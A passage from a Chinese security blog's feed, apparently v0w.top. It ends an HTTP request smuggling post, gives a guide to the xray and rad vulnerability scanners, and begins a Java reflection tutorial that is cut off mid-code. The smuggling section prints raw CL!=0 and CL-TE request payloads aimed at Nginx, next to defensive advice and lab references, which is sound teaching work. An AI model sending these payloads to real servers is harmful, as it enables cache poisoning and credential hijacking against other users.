请求走私</h2><p>Nginx&lt;=1.18.0及之前版本中存在安全漏洞。攻击者可利用该漏洞进行缓存投毒，劫持凭证或绕过安全保护。</p><p>没有什么特别的配置<br>CL!=0的情况<br>利用方面只需要注意计算好CL即可。可以发现这里的两个请求都进行了处理</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;hello.html HTTP&#x2F;1.1</span><br><span class="line">Host: 172.16.40.146</span><br><span class="line">Content-Length: 2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">GET &#x2F;test.html HTTP&#x2F;1.1</span><br><span class="line">Host: 172.16.40.146</span><br><span class="line">Content-Length: 2</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="http://image.v0w.top/2020/12/16086336990621.jpg" alt="CL!=0"></p><p>其他payload：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: www.0-sec.org</span><br><span class="line">Content-Length: 4</span><br><span class="line">Transfer-Encoding : chunked</span><br><span class="line"></span><br><span class="line">46</span><br><span class="line">GET &#x2F;404 HTTP&#x2F;1.1</span><br><span class="line">Host:www.0-sec.org</span><br><span class="line">Content-Length:15</span><br><span class="line"></span><br><span class="line">kk</span><br><span class="line">0s</span><br></pre></td></tr></table></figure><h1 id="0x06-Tools-amp-Check"><a href="#0x06-Tools-amp-Check" class="headerlink" title="0x06 Tools&amp;Check"></a>0x06 Tools&amp;Check</h1><p>PortSwigger开发了一个开源burp插件，用于检测http请求走私漏洞：<br><a href="https://github.com/portswigger/http-request-smuggler">HTTP Request Smuggler</a><br>可以直接在BApp中安装，也可以在github中看到源码和编译之后的jar包，其功能主要是针对一个请求，自动化的对其可能存在HTTP请求走私，进行测试，右键<code>Launch Smuggle probe</code>可以选择很多的payload：<br><img src="http://image.v0w.top/2020/12/16086275112636.jpg" alt="smuggler-payload"></p><p>我们还是一个lab为例：<br><a href="https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te">https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te</a></p><p>需要设置<code>Content-Length</code>和<code>Transfer-Encoding: chunked</code><br>右键选择<code>Smuggle Attack(CL-TE)</code>，Attack进行攻击，也可以进行脚本修改和选择不同的攻击脚本<br><img src="http://image.v0w.top/2020/12/16086294657551.jpg"></p><p>可以看到不同结果，说明存在HTTP请求走私：<br><img src="http://image.v0w.top/2020/12/16086293019966.jpg"></p><h1 id="0x07-防御策略"><a href="#0x07-防御策略" class="headerlink" title="0x07 防御策略"></a>0x07 防御策略</h1><blockquote><p>从前面的大量案例中，我们已经知道了HTTP请求走私的危害性，那么该如何防御呢？不针对特定的服务器，通用的防御措施大概有三种。</p><ul><li>禁用代理服务器与后端服务器之间的TCP连接重用。</li><li>使用HTTP/2协议。</li><li>前后端使用相同的服务器。</li></ul><p>以上的措施有的不能从根本上解决问题，而且有着很多不足，就比如禁用代理服务器和后端服务器之间的TCP连接重用，会增大后端服务器的压力。使用HTTP/2在现在的网络条件下根本无法推广使用，哪怕支持HTTP/2协议的服务器也会兼容HTTP/1.1。从本质上来说，HTTP请求走私出现的原因并不是协议设计的问题，而是不同服务器实现的问题，个人认为最好的解决方案就是严格的实现RFC7230-7235中所规定的的标准，但这也是最难做到的。</p></blockquote><p>然而我参考了比较多的攻击文章，均没有提到为什么 HTTP/2 可以防范 HTTP Smuggling ，原作者也是一句话带过:</p><blockquote><p>Use HTTP/2 for back-end connections, as this protocol prevents ambiguity about the boundaries between requests.</p></blockquote><p>之后我去查询了一下 HTTP/2 与 HTTP/1.1 的差异，个人认为主要是 HTTP/2 中加入了 <code>Request multiplexing over a single TCP connection</code> ，也就是说使用 HTTP/2 可以使用单个 TCP 连接来进行请求资源，也就减少了 TCP 连接复用的可能性，即使能 Smuggle 也只能打自己；而且对于新的二进制分帧机制引入也对该种攻击做出了限制。</p><p>具体可以参考 <a href="https://developers.google.com/web/fundamentals/performance/http2#%E6%AF%8F%E4%B8%AA%E6%9D%A5%E6%BA%90%E4%B8%80%E4%B8%AA%E8%BF%9E%E6%8E%A5">HTTP/2 简介</a></p><h1 id="0xFF-reference"><a href="#0xFF-reference" class="headerlink" title="0xFF reference"></a>0xFF reference</h1><ol><li><a href="https://www.youtube.com/watch?v=kgkRih2MQtU">视频-HTTP Desync Attacks: Smashing into the Cell Next Door</a>-James Kettle在blackHat上分享的如何通过TE扩大HTTP走私攻击的攻击面，并给出了一些实际案例，是paper2和paper3的基础</li><li><a href="https://paper.seebug.org/1048/">协议层的攻击——HTTP请求走私</a>-原理解释的比较清楚</li><li><a href="https://xz.aliyun.com/t/6878">一篇文章带你读懂 HTTP Smuggling 攻击</a>-对paper2做了补充，增加一些实际攻击案例</li><li><a href="https://i.blackhat.com/USA-19/Wednesday/us-19-Kettle-HTTP-Desync-Attacks-Smashing-Into-The-Cell-Next-Door-wp.pdf">PDF-HTTP Desync Attacks: Smashing into the Cell Next Door</a>-vedio1的pdf版本</li><li><a href="https://portswigger.net/web-security/request-smuggling">portswigger-HTTP request smuggling</a></li><li><a href="https://regilero.github.io/tag/Smuggling/">Regilero关于Smuggling的文章</a></li><li><a href="https://zhuanlan.zhihu.com/p/37387316">知乎-HTTP协议几个版本的比较</a></li><li><a href="https://tools.ietf.org/rfc/">RFC文档</a></li><li><a href="https://github.com/Ares-X/VulWiki/blob/a8a7d4d4d1530681e5b7f18daf7f471f7ff5c010/Web%E5%AE%89%E5%85%A8/Nginx/%EF%BC%88CVE-2019-20372%EF%BC%89Nginx%20error_page%20%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%BC%8F%E6%B4%9E.md">CVE-2019-20372</a></li><li><a href="https://github.com/Ares-X/VulWiki/blob/a8a7d4d4d1530681e5b7f18daf7f471f7ff5c010/Web%E5%AE%89%E5%85%A8/Nginx/%EF%BC%88CVE-2020-12440%EF%BC%89Nginx%20%3C%3D%201.8.0%20%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81.md">CVE-2020-12440</a></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;TL-DR&quot;&gt;&lt;a href=&quot;#TL-DR&quot; class=&quot;headerlink&quot; title=&quot;TL;DR&quot;&gt;&lt;/a&gt;TL;DR&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;http://image.v0w.top/2020/12/httpsmuggling.jpeg&quot;</summary>
      
    
    
    
    <category term="Web安全" scheme="http://v0w.top/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="XSS" scheme="http://v0w.top/tags/XSS/"/>
    
    <category term="协议层" scheme="http://v0w.top/tags/%E5%8D%8F%E8%AE%AE%E5%B1%82/"/>
    
    <category term="HTTPsmuggle" scheme="http://v0w.top/tags/HTTPsmuggle/"/>
    
  </entry>
  
  <entry>
    <title>xray &amp; rad</title>
    <link href="http://v0w.top/2020/12/14/xray_rad/"/>
    <id>http://v0w.top/2020/12/14/xray_rad/</id>
    <published>2020-12-13T16:00:00.000Z</published>
    <updated>2020-12-14T08:56:43.605Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-rad"><a href="#0x01-rad" class="headerlink" title="0x01 rad"></a>0x01 rad</h1><h2 id="1-0-简介"><a href="#1-0-简介" class="headerlink" title="1.0 简介"></a>1.0 简介</h2><p>rad，全名 Radium，名字来源于放射性元素——镭, 从一个URL开始，辐射到一整个站点空间</p><blockquote><p>一款专为安全扫描而生的浏览器爬虫</p></blockquote><p>下载地址<br><a href="https://github.com/chaitin/rad/releases">https://github.com/chaitin/rad/releases</a></p><h2 id="1-1-使用"><a href="#1-1-使用" class="headerlink" title="1.1 使用"></a>1.1 使用</h2><p>本工具需要提前装好新版本的 chrome，否则将无法使用</p><p>基本使用</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rad -t http:&#x2F;&#x2F;example.com</span><br></pre></td></tr></table></figure><p>需要手动登录的情况</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rad -t http:&#x2F;&#x2F;example.com -wait-login</span><br></pre></td></tr></table></figure><p>执行以上命令会自动禁用无头浏览模式，开启一个浏览器供手动登录。 在登录完毕后在命令行界面点击回车键继续爬取。</p><p>将爬取基本结果导出为文件</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rad -t http:&#x2F;&#x2F;example.com -text-output result.txt</span><br></pre></td></tr></table></figure><p>以上命令会将爬取到的URL输出到result.txt中 格式为 Method URL 例：GET <a href="http://example.com/">http://example.com</a></p><p>导出完整请求</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rad -t http:&#x2F;&#x2F;example.com -full-text-output result.txt</span><br></pre></td></tr></table></figure><p>导出完整请求为JSON</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rad -t http:&#x2F;&#x2F;example.com -json result.json</span><br></pre></td></tr></table></figure><p><img src="http://image.v0w.top/2020/12/16079334396290.jpg" alt="效果图"></p><h2 id="1-2-参数配置"><a href="#1-2-参数配置" class="headerlink" title="1.2 参数配置"></a>1.2 参数配置</h2><p>rad首次运行后会自动在当前目录生成rad_config.yml配置文件</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">enable-image-display: false                  # 启用图片显示，适用于需要验证码登录的情况，启用wait-login自动开启</span><br><span class="line">load-wait: 2                                 # 页面加载完毕后的等待时间，单位秒，网速不佳时可尝试调大该值</span><br><span class="line">exec-path: &quot;&quot;                                # 启动chrome的路径，为空会自动在默认路径寻找</span><br><span class="line">disable-headless: false                      # 禁用无头模式</span><br><span class="line">request-config:                              # 请求头配置</span><br><span class="line">  user-agent: &quot;&quot;                             # 请求user-agent配置</span><br><span class="line">  headers:                                   # 请求header配置</span><br><span class="line">  - key: &quot;&quot;                                  # header的key</span><br><span class="line">    value: &quot;&quot;                                # header的value</span><br><span class="line">  cookies:                                   # 请求cookie配置</span><br><span class="line">  - name: &quot;&quot;                                 # cookie的name</span><br><span class="line">    value: &quot;&quot;                                # cookie的value</span><br><span class="line">restrictions-on-urls:                        # 对爬取的URL的一些限制项</span><br><span class="line">  disallowed-suffix: []                      # 不允许的文件后缀</span><br><span class="line">  disallowed-keywords-in-path-and-query: []  # 不允许的URL关键字</span><br><span class="line">  disallowed-domain: []                      # 不允许的域名</span><br><span class="line">  disallowed-urls: []                        # 不允许的URL（正则）</span><br><span class="line">  allowed-domains: []                        # 允许的域名，起始目标会被自动加入其中</span><br><span class="line">  allowed-urls: []                           # 允许的URL（正则）</span><br><span class="line">restrictions-on-requests:                    # 对请求行为的一些限制项</span><br><span class="line">  max-concurrent: 10                         # 最大页面并发（不大于10）</span><br><span class="line">  max-depth: 5                               # 最大页面深度限制</span><br><span class="line">  max-click-depth: 5                         # 一个页面中最大点击深度限制</span><br><span class="line">  max-count-of-page: 1000                    # 最多爬取的页面数量限制</span><br><span class="line">  max-click-or-event-trigger: 1000           # 单个页面中最大点击或事件触发次数(不大于10000)</span><br><span class="line">  click-or-event-interval: 1000              # 点击间隔，单位毫秒</span><br></pre></td></tr></table></figure><h1 id="0x02-xray"><a href="#0x02-xray" class="headerlink" title="0x02 xray"></a>0x02 xray</h1><h2 id="2-1-简介"><a href="#2-1-简介" class="headerlink" title="2.1 简介"></a>2.1 简介</h2><p>xray是长亭科技开发，一款基于go语言编写，具有被动扫描和主动探测功能的漏洞扫描器。</p><ul><li><a href="https://docs.xray.cool/">官方文档</a></li><li><a href="http://xray.cool/">官网地址</a></li></ul><h2 id="2-2-使用"><a href="#2-2-使用" class="headerlink" title="2.2 使用"></a>2.2 使用</h2><h3 id="2-2-0-安装证书-amp-配置文件"><a href="#2-2-0-安装证书-amp-配置文件" class="headerlink" title="2.2.0 安装证书&amp;配置文件"></a>2.2.0 安装证书&amp;配置文件</h3><p><code>./xray genca</code>生成证书，安装证书之后可以使用。<br>配置文件<code>config.yaml</code>在第一次使用后自动生成，可以对配置文件进行编辑以获取个性化的配置以及提升扫描速度等等。</p><p><img src="http://image.v0w.top/2020/12/16077579119360.jpg" alt="config.yaml"><br>我们可以在plugins中设置扫描哪些漏洞和问题，比如我们只想扫描SQL注入，就可以将一些其他类似基线检查，暴力破解等插件的开关设置为false，可以大大提高执行和扫描效率。</p><h3 id="2-2-1-代理模式进行被动扫描"><a href="#2-2-1-代理模式进行被动扫描" class="headerlink" title="2.2.1 代理模式进行被动扫描"></a>2.2.1 代理模式进行被动扫描</h3><p>个人认为这个是xray最牛逼，区别于其他扫描器的功能。只需要在浏览器配置好代理，就可以使用其代理模式，无需反复验证身份，即可使用浏览器的cookie，我们需要做的就是对系统不停的点击，尽可能的将流量通过xray代理，xray在后台就可以自动对输入的流量进行抓包和重发，每次重放自动适配不同的payload，从而达到黑盒测试的效果。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xray webscan --listen 127.0.0.1:7777 --html-output 1.html</span><br></pre></td></tr></table></figure><p>也可以在burp配置上流代理，将流量同时送到burp和xray。<br><img src="http://image.v0w.top/2020/12/16077578176052.jpg" alt="burp上游代理配置成xray"></p><h3 id="2-2-2-爬虫模式进行主动扫描"><a href="#2-2-2-爬虫模式进行主动扫描" class="headerlink" title="2.2.2 爬虫模式进行主动扫描"></a>2.2.2 爬虫模式进行主动扫描</h3><p>爬虫模式是模拟人工去点击网页的链接，然后去分析扫描，和代理模式不同的是，爬虫不需要人工的介入，访问速度要快很多，但是也有一些缺点需要注意：</p><ul><li>xray 的基础爬虫不能处理 js 渲染的页面。</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;xray webscan --basic-crawler http:&#x2F;&#x2F;testphp.vulnweb.com&#x2F; --html-output xray-crawler-testphp.html</span><br></pre></td></tr></table></figure><p>如果用的是代理模式，只要浏览器是登录状态，那么漏洞扫描收到的请求也都是登录状态的请求。但对于普通爬虫而言，就没有这么“自动化”了， 但是可以通过配置 Cookie 的方式实现登录后的扫描。</p><p>打开配置文件，修改 http 配置部分的 Headers 项:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:</span><br><span class="line">  headers:</span><br><span class="line">    Cookie: key&#x3D;value</span><br></pre></td></tr></table></figure><p>上述配置将为所有请求（包括爬虫和漏洞扫描）增加一条 <code>Cookie:key=value</code></p><h3 id="2-2-3-服务扫描"><a href="#2-2-3-服务扫描" class="headerlink" title="2.2.3 服务扫描"></a>2.2.3 服务扫描</h3><p>可以使用xray对服务器的各种服务进行扫描，但是目前的poc比较少，而且需要使用者指定IP端口。事实上，针对服务扫描我更推荐goby，nessus等专门扫描IP服务的工具。</p><p>参数配置目前比较简单，输入支持两种方式，例如:</p><p>快速检测单个目标</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;xray servicescan --target 127.0.0.1:8009</span><br></pre></td></tr></table></figure><p>批量检查的 1.file 中的目标, 一行一个目标，带端口</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;xray servicescan --target-file 1.file </span><br></pre></td></tr></table></figure><p>其中 1.file 的格式为一个行一个 service，如</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10.3.0.203:8009</span><br><span class="line">127.0.0.1:8009</span><br></pre></td></tr></table></figure><p>也可以将结果输出到报告或json文件中</p><p>将检测结果输出到 html 报告中</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;xray servicescan --target 127.0.0.1:8009 --html-output service.html</span><br><span class="line">.&#x2F;xray servicescan --target-file 1.file --html-output service.html</span><br></pre></td></tr></table></figure><p>将检测结果输出到 json 文件中</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;xray servicescan --target 127.0.0.1:8099 --json-output 1.json </span><br></pre></td></tr></table></figure><h2 id="2-3-自定义poc"><a href="#2-3-自定义poc" class="headerlink" title="2.3 自定义poc"></a>2.3 自定义poc</h2><h3 id="2-3-1-自己编写poc"><a href="#2-3-1-自己编写poc" class="headerlink" title="2.3.1 自己编写poc"></a>2.3.1 自己编写poc</h3><p>格式</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">poc-yaml-example-com</span></span><br><span class="line"><span class="attr">rules:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">method:</span> <span class="string">GET</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">&quot;/&quot;</span></span><br><span class="line">    <span class="attr">expression:</span> <span class="string">|</span></span><br><span class="line">      <span class="string">response.status==200</span> <span class="string">&amp;&amp;</span> <span class="string">response.body.bcontains(b&#x27;Example</span> <span class="string">Domain&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="attr">detail:</span></span><br><span class="line">  <span class="attr">author:</span> <span class="string">name(link)</span></span><br><span class="line">  <span class="attr">links:</span> </span><br><span class="line">    <span class="bullet">-</span> <span class="string">http://example.com</span></span><br></pre></td></tr></table></figure><p><a href="https://docs.xray.cool/#/guide/poc">自定义POC语法</a></p><p>根据官方规则编写poc，可以自行使用和贡献社区，贡献社区还可以获取一定的奖励，非常nice。</p><h3 id="2-3-2-使用自定义的poc进行测试"><a href="#2-3-2-使用自定义的poc进行测试" class="headerlink" title="2.3.2 使用自定义的poc进行测试"></a>2.3.2 使用自定义的poc进行测试</h3><p>在配置文件config.yaml中.</p><p>phantasm 是 xray 的 poc 框架，在其下运行着许多 yaml 和 go 写的 poc，用户可以通过该模块编写自己的 poc 并让 xray 加载，具体见后续 <a href="https://docs.xray.cool/#/guide/poc">自定义POC语法</a></p><p>这里我们先介绍一下它的两个重点配置:</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">depth:</span> <span class="number">1</span>                            <span class="comment"># 与 dirscan 一样，不再赘述</span></span><br><span class="line"><span class="attr">exclude_poc:</span> []                     <span class="comment"># 排除哪些 poc, 支持 glob 语法, 如: /home/poc/*thinkphp* 或 poc-yaml-weblogic*</span></span><br><span class="line"><span class="attr">local_poc:</span> []                       <span class="comment"># 加载本地的 poc, 支持 glob 语法, 如： /home/poc/*CopyErrorCopied</span></span><br></pre></td></tr></table></figure><p><code>exclude_poc</code> 用于去除加载哪些 poc。一个常见的 case 是如果发现某些 poc 误报比较多，想暂时禁用掉（并反馈给 xray)，那么就可以在这一个配置中加上 poc 的名字，比如:</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">plugins:</span></span><br><span class="line">  <span class="string">...</span></span><br><span class="line">  <span class="attr">phantasm:</span></span><br><span class="line">    <span class="attr">enabled:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">exclude_poc:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">poc-yaml-bad-poc</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">*bad-poc*</span></span><br></pre></td></tr></table></figure><p><code>local_poc</code> 是用于加载本地的 poc 的配置，最好指定绝对路径，且同样支持 glob 语法。</p><p>一个稍微复杂的情况是将这两个搭配起来使用，比如:</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">plugins:</span></span><br><span class="line">  <span class="string">...</span></span><br><span class="line">  <span class="attr">phantasm:</span></span><br><span class="line">    <span class="attr">enabled:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">exclude_poc:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">/home/poc/poc-fake-good-poc</span></span><br><span class="line">    <span class="attr">local_poc:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">/home/poc/*good-poc*</span></span><br></pre></td></tr></table></figure><p>上述配置的意思是加载 <code>/home/poc/</code> 目录下所有符合 <code>*good-poc*</code> 这个pattern 的poc，同时去掉同样目录下的 <code>poc-fake-good-poc</code></p><h2 id="2-4-配合其他工具使用"><a href="#2-4-配合其他工具使用" class="headerlink" title="2.4 配合其他工具使用"></a>2.4 配合其他工具使用</h2><p>xray配合其他工具进行测试，可以达成非常好的效果。</p><h3 id="2-4-1-配合burp"><a href="#2-4-1-配合burp" class="headerlink" title="2.4.1 配合burp"></a>2.4.1 配合burp</h3><p>前文也有提及：<br>在burp配置上流代理，将流量同时送到burp和xray。<br><img src="http://image.v0w.top/2020/12/16077578176052.jpg" alt="burp上游代理配置成xray"><br>这种方式最大的好处可以通过一次点击将流量同时发送到xray和burp，然后xray会进行自动扫描，而我们可以通过target和history对请求进行复现和检查，这样可以人机双线程同时开工，大大提高了我们渗透测试和漏洞挖掘的效率。<br><img src="http://image.v0w.top/2020/12/16079288131640.jpg" alt="target"></p><p><img src="http://image.v0w.top/2020/12/16079288779378.jpg" alt="http-history"></p><p><img src="http://image.v0w.top/2020/12/16079289258379.jpg" alt="logger++"></p><h3 id="2-4-2-配合AWVS的爬虫"><a href="#2-4-2-配合AWVS的爬虫" class="headerlink" title="2.4.2 配合AWVS的爬虫"></a>2.4.2 配合AWVS的爬虫</h3><p>众所周知，AWVS的爬虫功能十分强大，而其检测功能虽然也很强大，但是依赖配置cookie或者配置自动登录，相对而言，不如xray的被动扫描来的简单直接。</p><p>我们可以通过使用AWVS的爬虫功能，配合xray的代理被动扫描模式，使两者各显所长。<br>首先启动 xray 的被动代理，下面的命令将启动一个监听在所有网卡 7777 端口的 HTTP 代理, 并将扫描结果保存在 awvs.html 内。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;xray webscan --listen 0.0.0.0:7777 --html-output awvs.html</span><br></pre></td></tr></table></figure><p>以 awvs 13 web 版为例，登入管理页后，点击 Targets, 然后点击 Add Target 添加扫描目标:<br>比如我们使用AWVS官方提供在线靶站 <a href="http://testphp.vulnweb.com/">http://testphp.vulnweb.com</a></p><p><img src="http://image.v0w.top/2020/12/16079295597260.jpg" alt="target"></p><p>然后切换到 HTTP 的部分，填写 xray 的 HTTP 代理。<br><img src="http://image.v0w.top/2020/12/16079296245430.jpg" alt="http-proxy"><br>地址需要根据实际情况填写，需要填写为 awvs 所在机器（容器）内能够访问到 xray 代理的地址。如果 xray 在外网，则填写为外网主机的 IP 地址。端口填写为上面启动时设置的端口号。</p><p>其他项可以按需调整或保持默认，然后点击 scan 按钮，按图示选择 Crawl Only 即仅使用爬虫，然后点击 Create Scan 就可以开始扫描了。<br><img src="http://image.v0w.top/2020/12/16079296795037.jpg" alt="crawl"></p><p>检查 xray 的界面有没有在扫描，如果有类似下图的结果说明工作正常，等待扫描完成即可。完成扫描后，可以在awvs.html看到详细的扫描结果。<br><img src="http://image.v0w.top/2020/12/16079342312033.jpg" alt="扫描结果"><br><img src="http://image.v0w.top/2020/12/16079343885841.jpg" alt="html形式"></p><h3 id="2-4-3-xray-rad爬虫"><a href="#2-4-3-xray-rad爬虫" class="headerlink" title="2.4.3 xray+rad爬虫"></a>2.4.3 xray+rad爬虫</h3><p>之前提到为什么使用xray+awvs，主要就是想解决xray自身爬虫的缺陷。针对这个缺陷，长亭xray项目组开发了rad进行进一步的解决。前文已经简单介绍一下rad的使用，其原理也比较容易理解：从一个url开始，爬取其中的内容，对其中存在的url如超链接等，做进一步解析和爬取内容中的url，循环递归进行，从而尽可能获取较为完整的url信息和一些目录信息。</p><p>当然，如果说要求像平时渗透测试子域名爆破或者目录爆破一样尽可能完整的信息收集，rad可能无法做到。但是作为一款爬虫软件，就从一个url来获取更多的信息的能力来看，rad有很多可取之处，也解决了xray等扫描软件的痛点——即需要从一个或几个url尽可能多的获取存在的页面，为xray的扫描提供了足够的信息。</p><p>社区版：设置上级代理为xray监听地址 运行xray：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xray webscan --listen 127.0.0.1:7777 --html-output proxy.html</span><br></pre></td></tr></table></figure><p>运行rad：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rad -t http:&#x2F;&#x2F;example.com -http-proxy 127.0.0.1:7777</span><br></pre></td></tr></table></figure><p>高级版对 rad 进行了深度融合，下载后可以一键使用：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xray webscan --browser-crawler http:&#x2F;&#x2F;example.com --html-output vuln.html</span><br></pre></td></tr></table></figure><p><img src="http://image.v0w.top/2020/12/16079354827184.jpg" alt="rad"></p><p><img src="http://image.v0w.top/2020/12/16079355361400.jpg" alt="xray"></p><p>效果和awvs+xray类似，但是rad更加原生，配置也比awvs简单非常多，rad+xray就非常nice。可以将xray的扫描能力已主动扫描的方式发挥出来。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x01-rad&quot;&gt;&lt;a href=&quot;#0x01-rad&quot; class=&quot;headerlink&quot; title=&quot;0x01 rad&quot;&gt;&lt;/a&gt;0x01 rad&lt;/h1&gt;&lt;h2 id=&quot;1-0-简介&quot;&gt;&lt;a href=&quot;#1-0-简介&quot; class=&quot;headerli</summary>
      
    
    
    
    <category term="系统与工具" scheme="http://v0w.top/categories/%E7%B3%BB%E7%BB%9F%E4%B8%8E%E5%B7%A5%E5%85%B7/"/>
    
    
    <category term="自动化测试fuzz" scheme="http://v0w.top/tags/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95fuzz/"/>
    
  </entry>
  
  <entry>
    <title>Java反射机制</title>
    <link href="http://v0w.top/2020/10/03/javareflection/"/>
    <id>http://v0w.top/2020/10/03/javareflection/</id>
    <published>2020-10-02T16:00:00.000Z</published>
    <updated>2020-12-10T06:01:02.813Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java反射机制"><a href="#Java反射机制" class="headerlink" title="Java反射机制"></a>Java反射机制</h1><h2 id="0x01-一些概念-amp-类对象"><a href="#0x01-一些概念-amp-类对象" class="headerlink" title="0x01 一些概念&amp;类对象"></a>0x01 一些概念&amp;类对象</h2><h3 id="1-0-静态语言VS动态语言"><a href="#1-0-静态语言VS动态语言" class="headerlink" title="1.0 静态语言VS动态语言"></a>1.0 静态语言VS动态语言</h3><p>所谓<strong>动态语言</strong>就是在运行过程中可以改变其自身结构的语言。比如我们在python中运行一段代码，定义一个变量，可以不定义它到底是一个什么数据结构的变量，而在代码运行期间，其他代码或者不同条件对这个变量进行赋值，赋什么值，它就是什么结构。</p><p>而<strong>静态语言</strong>则不同，在定义一个变量的时候，必须同时定义它的类型结构等等，并且一般情况下更改不了。</p><p>常见的动态语言有：python，php，JavaScript，C#等。</p><p>常见的静态语言有：C，C++，Java等。</p><h3 id="1-1-反射"><a href="#1-1-反射" class="headerlink" title="1.1 反射"></a>1.1 反射</h3><blockquote><p>Java 反射机制在程序运行时，对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意一个方法和属性。这种 动态的获取信息 以及 动态调用对象的方法 的功能称为 java 的反射机制。</p><p>反射机制很重要的一点就是“运行时”，其使得我们可以在程序运行时加载、探索以及使用编译期间完全未知的 .class 文件。换句话说，Java 程序可以加载一个运行时才得知名称的 .class 文件，然后获悉其完整构造，并生成其对象实体、或对其 fields（变量）设值、或调用其 methods（方法）。</p><p>Reflection反射是Java被称为动态语言的关键，反射允许程序执行期间借助Reflection API取得任何类的内部信息，并直接操作任何对象的内部属性和方法。</p></blockquote><p>这些概念性的东西太抽象了。简单点说，发射给Java这个静态语言增加了动态语言的特征，使Java变成了准动态语言。我们可以利用反射机制，获取一个类的变量方法，甚至包括private的变量方法，并且可以更改其原有的结构。</p><h3 id="1-2-类对象"><a href="#1-2-类对象" class="headerlink" title="1.2 类对象"></a>1.2 类对象</h3><p>类对象：这个对象就是在加载完class，之后在堆内存方法区产生的Class类型的对象。所有的类都有一个自己的类对象，用于提供类本身的信息，比如方法属性，构造方法等。这个对象像是一个镜子，通过这个对象可以看到类的所有结构，所以，我们形象的称之为：反射。</p><p><img src="http://image.v0w.top/2020/12/16074924436465.jpg" alt="-w589"></p><h3 id="1-3-Reflection-API"><a href="#1-3-Reflection-API" class="headerlink" title="1.3 Reflection API"></a>1.3 Reflection API</h3><ul><li>java.lang.Class //代表一个类</li><li>java.lang.reflect.Method //代表类的方法</li><li>java.lang.reflect.Field //代表类的成员变量</li><li>java.lang.reflect.Constructor //代表类的构造器</li></ul><p><img src="http://image.v0w.top/2020/12/16075796382858.jpg"></p><h3 id="1-4-获取类对象的方法"><a href="#1-4-获取类对象的方法" class="headerlink" title="1.4 获取类对象的方法"></a>1.4 获取类对象的方法</h3><p>获取类对象的三种主要方式：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. Class.forName(&quot;com.charactor.Hero&quot;);</span><br><span class="line">2. Hero.class;</span><br><span class="line">3. Hero hero &#x3D; new Hero(); hero.getClass()</span><br><span class="line">&#x2F;&#x2F;以下并非主要方式</span><br><span class="line">4. 基本数据类型的包装类，如Integer有一个TYPE属性可以用于获取class</span><br><span class="line">5. 子类对象可以通过getSuperclass获取父类class对象</span><br></pre></td></tr></table></figure><p>具体举个例子：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> reflection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> java.lang.Class.forName;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test01</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException </span>&#123;</span><br><span class="line">        Person person =  <span class="keyword">new</span> Student();</span><br><span class="line">        System.out.println(<span class="string">&quot;this person is: &quot;</span>+ person.name);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//方式一：通过对象获取</span></span><br><span class="line">        Class c1 = person.getClass();</span><br><span class="line">        System.out.println(c1.hashCode());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//方式二：Class.forname获取</span></span><br><span class="line">        Class c2 = Class.forName(<span 